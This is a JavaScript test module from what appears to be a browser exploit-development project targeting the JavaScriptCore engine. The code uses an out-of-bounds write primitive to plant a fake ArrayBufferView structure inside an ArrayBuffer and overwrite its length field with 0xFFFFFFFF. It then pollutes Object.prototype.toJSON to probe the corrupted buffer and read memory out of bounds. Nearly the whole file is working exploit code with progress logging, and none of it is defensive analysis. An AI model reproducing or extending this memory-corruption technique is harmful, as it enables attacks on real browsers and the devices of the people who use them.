// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v24_SelfCorruptAndProbe_FixRef"; // Nova versão com correção

// --- Constantes para a Estrutura Fake da ArrayBufferView em 0x58 ---
const FAKE_VIEW_BASE_OFFSET_IN_OOB    = 0x58;
const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; 
const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       
const FAKE_VIEW_TYPEINFO_FLAGS        = 0x00;
const FAKE_VIEW_CELLINFO_INDEXINGTYPE = 0x0F;
const FAKE_VIEW_CELLINFO_STATE        = 0x01;
const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero; 
const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero;
const FAKE_VIEW_MLENGTH_INITIAL_PLANT = 0x100;      
const FAKE_VIEW_MMODE_VALUE           = 0x00000000;

// --- Constantes para a Corrupção Crítica ---
// Calculado dinamicamente na função principal usando JSC_OFFSETS
// const CRITICAL_OOB_WRITE_OFFSET = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; 

// --- Marcadores para Leitura via Potencial SuperView ---
const OOB_BUFFER_MARKER_OFFSET = 0x0; 
const OOB_BUFFER_MARKER_VALUE  = 0x41424344; // 'ABCD'
const OTHER_SID_READ_OFFSET    = 0x400; 
const OTHER_SID_READ_VALUE     = 0xFEEDFACE;

let getter_probe_details_v24 = null; // Renomeado para v24

// ============================================================
// FUNÇÃO toJSON Poluída para Sondar 'this' (que será o oob_array_buffer_real)
// ============================================================
// Definição da função ANTES de ser usada.
function toJSON_ProbeArrayBufferState_v24() { // Mantendo o nome para consistência com o log
    const FNAME_toJSON = "toJSON_ProbeArrayBufferState_v24";
    
    getter_probe_details_v24 = {
        toJSON_executed: FNAME_toJSON,
        this_type: "N/A",
        this_byteLength: "N/A",
        read_at_0: "N/A",
        read_at_fake_view_sid: "N/A",
        read_at_other_sid: "N/A",
        error: null
    };

    try {
        getter_probe_details_v24.this_type = Object.prototype.toString.call(this);
        
        if (!(this instanceof ArrayBuffer)) {
            getter_probe_details_v24.error = "CRITICAL: 'this' is not an ArrayBuffer in toJSON_ProbeArrayBufferState_v24.";
            // Evitar logS3 diretamente daqui em caso de estado muito instável
            return getter_probe_details_v24;
        }

        getter_probe_details_v24.this_byteLength = this.byteLength;

        if (this.byteLength === CRITICAL_OOB_WRITE_VALUE) {
            // Só logar de dentro se for o caso MUITO interessante
            // logS3(`[${FNAME_toJSON}] SUCCESS? 'this' (oob_ab) tem byteLength = ${toHex(this.byteLength)}. Lendo...`, "vuln", FNAME_toJSON);
            try {
                const temp_view = new Uint32Array(this); 
                getter_probe_details_v24.read_at_0 = toHex(temp_view[OOB_BUFFER_MARKER_OFFSET / 4]);
                getter_probe_details_v24.read_at_fake_view_sid = toHex(temp_view[FAKE_VIEW_BASE_OFFSET_IN_OOB / 4]);
                getter_probe_details_v24.read_at_other_sid = toHex(temp_view[OTHER_SID_READ_OFFSET / 4]);
            } catch (e_read) {
                getter_probe_details_v24.error = (getter_probe_details_v24.error || "") + ` Error reading elements: ${e_read.message}`;
            }
        }
    } catch (e_main) {
        getter_probe_details_v24.error = (getter_probe_details_v24.error || "") + ` General error in toJSON: ${e_main.name} - ${e_main.message}`;
    }
    return getter_probe_details_v24;
}

// ============================================================
// FUNÇÃO PRINCIPAL (v24_SelfCorruptAndProbe_FixRef)
// ============================================================
export async function sprayAndInvestigateObjectExposure() { 
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.selfCorruptAndProbe`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Corromper oob_array_buffer_real e Sondá-lo (FixRef) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `SelfCorrupt v24_FixRef Test...`;

    getter_probe_details_v24 = null; 
    let errorCaptured = null;
    let stringifyResult = null;
    let potentiallyCrashed = true; 

    // Calcular o offset crítico dinamicamente
    let critical_oob_write_offset_calculated = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
    logS3(`   Offset de escrita crítica calculado: ${toHex(critical_oob_write_offset_calculated)} (0x58 + ${JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET})`, "info", FNAME_CURRENT_TEST);


    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Plantando estrutura fake em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)} com m_length=${toHex(FAKE_VIEW_MLENGTH_INITIAL_PLANT)}...`, "info", FNAME_CURRENT_TEST);
        const sidOffset      = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET, 16);
        const typeInfoBaseOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET, 16);
        const bufferPtrOff   = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET, 16);
        const mVectorOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 16);
        const mLengthOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16); 
        const mModeOffset    = FAKE_VIEW_BASE_OFFSET_IN_OOB + parseInt(JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET, 16);

        oob_write_absolute(sidOffset, FAKE_VIEW_STRUCTURE_ID, 4);
        oob_write_absolute(typeInfoBaseOffset + 0, FAKE_VIEW_TYPEINFO_TYPE, 1);
        oob_write_absolute(typeInfoBaseOffset + 1, FAKE_VIEW_TYPEINFO_FLAGS, 1);
        oob_write_absolute(typeInfoBaseOffset + 2, FAKE_VIEW_CELLINFO_INDEXINGTYPE, 1);
        oob_write_absolute(typeInfoBaseOffset + 3, FAKE_VIEW_CELLINFO_STATE, 1);
        oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8); 
        oob_write_absolute(mVectorOffset, FAKE_VIEW_MVECTOR_VALUE, 8);
        oob_write_absolute(mLengthOffset, FAKE_VIEW_MLENGTH_INITIAL_PLANT, 4); 
        oob_write_absolute(mModeOffset, FAKE_VIEW_MMODE_VALUE, 4);
        logS3(`  Estrutura fake plantada em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}.`, "good", FNAME_CURRENT_TEST);

        oob_write_absolute(OOB_BUFFER_MARKER_OFFSET, OOB_BUFFER_MARKER_VALUE, 4);
        logS3(`  Plantado Marcador OOB (${toHex(OOB_BUFFER_MARKER_VALUE)}) em ${toHex(OOB_BUFFER_MARKER_OFFSET)}`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(OTHER_SID_READ_OFFSET, OTHER_SID_READ_VALUE, 4);
        logS3(`  Plantado Outro Marcador (${toHex(OTHER_SID_READ_VALUE)}) em ${toHex(OTHER_SID_READ_OFFSET)}`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(50);

        logS3(`PASSO 2: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(critical_oob_write_offset_calculated)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(critical_oob_write_offset_calculated, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita crítica em ${toHex(critical_oob_write_offset_calculated)} realizada. m_length da estrutura fake em 0x58 agora deve ser ${toHex(CRITICAL_OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(50);
        
        logS3(`PASSO 3: Tentando JSON.stringify(oob_array_buffer_real) com ${toJSON_ProbeArrayBufferState_v24.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_ProbeArrayBufferState_v24, // Usando a função definida neste arquivo
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(oob_array_buffer_real)...`, "info", FNAME_CURRENT_TEST);
            stringifyResult = JSON.stringify(oob_array_buffer_real); 
            potentiallyCrashed = false; 
            
            logS3(`  JSON.stringify completou. Resultado (getter_probe_details_v24): ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (stringifyResult) {
                if (stringifyResult.error) {
                    logS3(`    ERRO DENTRO da toJSON: ${stringifyResult.error}`, "error", FNAME_CURRENT_TEST);
                }
                if (stringifyResult.this_byteLength === CRITICAL_OOB_WRITE_VALUE) {
                    logS3("    !!!! SUCESSO ESPECULATIVO !!!! 'this' (oob_array_buffer_real) no toJSON tem byteLength IGUAL ao CRITICAL_OOB_WRITE_VALUE!", "vuln", FNAME_CURRENT_TEST);
                    logS3(`      Leitura de this[0] (OOB_MARKER): ${stringifyResult.read_at_0}`, "leak", FNAME_CURRENT_TEST);
                    logS3(`      Leitura de this[0x58/4] (FAKE_SID): ${stringifyResult.read_at_fake_view_sid}`, "leak", FNAME_CURRENT_TEST);
                    logS3(`      Leitura de this[0x400/4] (OTHER_SID): ${stringifyResult.read_at_other_sid}`, "leak", FNAME_CURRENT_TEST);
                    document.title = "SelfCorrupt SUCCESS: OOB_AB size & R/W OK?";
                } else if (typeof stringifyResult.this_byteLength === 'number') {
                    logS3(`    INFO: oob_array_buffer_real.byteLength (em toJSON) = ${stringifyResult.this_byteLength} (esperado ${toHex(CRITICAL_OOB_WRITE_VALUE)} ou ${toHex(FAKE_VIEW_MLENGTH_INITIAL_PLANT)})`, "info", FNAME_CURRENT_TEST);
                }
            }

        } catch (e_stringify) {
            errorCaptured = e_stringify;
            potentiallyCrashed = false;
            logS3(`  ERRO CRÍTICO durante JSON.stringify(oob_array_buffer_real): ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `SelfCorrupt JSON_CRASH: ${e_stringify.name}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_main) {
        errorCaptured = e_main;
        potentiallyCrashed = false; 
        logS3(`ERRO CRÍTICO GERAL: ${e_main.name} - ${e_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_main.stack) logS3(`Stack: ${e_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU: ${e_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
    // Retornar o objeto com os resultados para o orquestrador
    return { errorOccurred: errorCaptured, potentiallyCrashed, stringifyResult, getter_probe_details: getter_probe_details_v24 };
}
